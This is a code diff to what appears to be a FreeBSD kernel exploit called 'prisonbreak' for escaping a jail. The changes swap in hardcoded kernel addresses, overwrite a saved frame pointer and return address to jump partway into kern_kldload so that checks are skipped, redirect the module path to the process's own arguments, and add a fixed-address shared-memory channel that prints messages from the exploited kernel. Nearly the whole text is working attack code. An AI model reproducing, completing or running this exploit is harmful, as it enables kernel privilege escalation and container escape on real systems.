@@ -10,6 +10,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <sys/ioctl.h>
+#include <sys/mman.h>
 #include <sys/socket.h>
 #include <sys/sysctl.h>
 #include <sys/types.h>
@@ -21,10 +22,10 @@
 #define NUM_CARP_IFS 12
 #define IF_NAME "epair100b"
 
-// #define DEBUG_RESTORED_RBP_ADDRESS 0xfffffe0070e09cc0
+#define DEBUG_RESTORED_RBP_ADDRESS 0xfffffe0070e09cc0
 #define PRODUCTION_RESTORED_RBP_ADDRESS 0xfffffe0070e09cc0 - 1000
 
-// #define DEBUG_KERN_KLDLOAD_ADDRESS 0xffffffff80af7af0
+#define DEBUG_KERN_KLDLOAD_ADDRESS 0xffffffff80af7af0
 #define PRODUCTION_KERN_KLDLOAD_ADDRESS 0xffffffff80b3db70
 
 typedef struct synchdr {
@@ -38,6 +39,12 @@ typedef struct synchdr {
   int sm_len;      /* length of the data section */
   void* sm_sl;     /* back pointer to parent */
 } synchdr_t;
+
+struct print_msg {
+  unsigned int entry_ready;
+  unsigned int len;
+  char msg[0];
+};
 
 /*
 Prerequisites
@@ -108,6 +115,30 @@ unsigned long get_td() {
   }
 
   return (unsigned long)kp.ki_tdaddr;
+}
+
+unsigned long get_pargs() {
+  int mib[4];
+  struct kinfo_proc kp;
+  size_t len = sizeof(kp);
+  pid_t pid = getpid();
+
+  /* mib = { CTL_KERN, KERN_PROC, KERN_PROC_PID, pid } */
+  mib[0] = CTL_KERN;
+  mib[1] = KERN_PROC;
+  mib[2] = KERN_PROC_PID;
+  mib[3] = pid;
+
+  if (sysctl(mib, 4, &kp, &len, NULL, 0) == -1) {
+    err(1, "sysctl(KERN_PROC_PID)");
+  }
+
+  if (len < sizeof(kp)) {
+    fprintf(stderr, "sysctl returned too little data (len=%zu)\n", len);
+    return 1;
+  }
+
+  return (unsigned long)kp.ki_args + 50;
 }
 
 void* prisonbreak(void* arg) {
@@ -229,9 +260,9 @@ void* prisonbreak(void* arg) {
   int kernel_module_path_offset = 2864;
   // int kernel_module_path_offset = 2864 + 8;
   ptr = (unsigned long*)((char*)header + kernel_module_path_offset);
-  *ptr = (unsigned long)kernel_module_path;
   // *ptr = 0x3333333333333333;
   // *ptr = (unsigned long)kernel_module_path;
+  *ptr = get_pargs();
 
   // Overwrite the address where kern_kldload is going to read the fileid
   int fileid_offset = 2840;
@@ -243,14 +274,14 @@ void* prisonbreak(void* arg) {
   // Restore $rbp
   int rbp_offset = 2880;
   ptr = (unsigned long*)((char*)header + rbp_offset);
-  *ptr = RESTORED_RBP_ADDRESS;
+  *ptr = DEBUG_RESTORED_RBP_ADDRESS;
 
   // Overwrite the return address to jump into something we can use, e.g.
   // `kern_kldload()`. 2048 + 32 = 2080 (start of our overflow) + 808 bytes
   // = 2888
   int return_address_offset = 2888;
   ptr = (unsigned long*)((char*)header + return_address_offset);
-  unsigned long kern_kldload = KERN_KLDLOAD_ADDRESS;
+  unsigned long kern_kldload = DEBUG_KERN_KLDLOAD_ADDRESS;
   // NOTE: We jump 69 bytes *into* kern_kldload to bypass some checks, i.e.
   // making sure none of the guards spot us.
   unsigned long jump_to_address = kern_kldload + 69;
@@ -281,7 +312,57 @@ void* prisonbreak(void* arg) {
   return NULL;
 }
 
+int map_memory() {
+  size_t pages = 4;
+  size_t len = 4096 * pages;
+
+  void* fixed = (void*)(uintptr_t)0x0000414141410000ULL;
+
+  int prot = PROT_READ | PROT_WRITE;
+  int flags = MAP_PRIVATE | MAP_ANONYMOUS;
+
+  char* p = mmap(fixed, len, prot, flags | MAP_FIXED, -1, 0);
+  if (p == MAP_FAILED) {
+    fprintf(stderr, "mmap failed: %s\n", strerror(errno));
+    return 1;
+  }
+
+  printf("Mapped %zu bytes (%zu pages) at fixed address %p\n", len, pages, p);
+  memset(p, 0x00, len);
+
+  // if (mlock(p, len) != 0) {
+  //   fprintf(stderr, "mlock failed: %s\n", strerror(errno));
+  //   fprintf(stderr, "Hint: check RLIMIT_MEMLOCK (ulimit -l) / CAP_IPC_LOCK.\n");
+  //   munmap(p, len);
+  //   return 4;
+  // }
+
+  // printf("Locked mapping with mlock().\n");
+
+  // Do work...   exploit .....
+  return 0;
+}
+
+void dispatch_messages() {
+  void* fixed = (void*)(uintptr_t)0x0000414141410000ULL;
+  struct print_msg* msg = fixed;
+
+  while (1) {
+    while (msg->entry_ready == 0);
+
+    if (msg->entry_ready == 2) {
+      printf("Final message received. Exploit done.\n");
+
+      return;
+    }
+
+    printf("MSG: %s", msg->msg);
+    msg = (struct print_msg*)(((char*)msg) + msg->len + sizeof(struct print_msg));
+  }
+}
+
 int main() {
+  map_memory();
   pthread_t thread1;
 
   if (pthread_create(&thread1, NULL, prisonbreak, NULL) != 0) {
@@ -289,7 +370,7 @@ int main() {
     return 1;
   }
 
-  sleep(2);
+  dispatch_messages();
 
   return 0;
 }
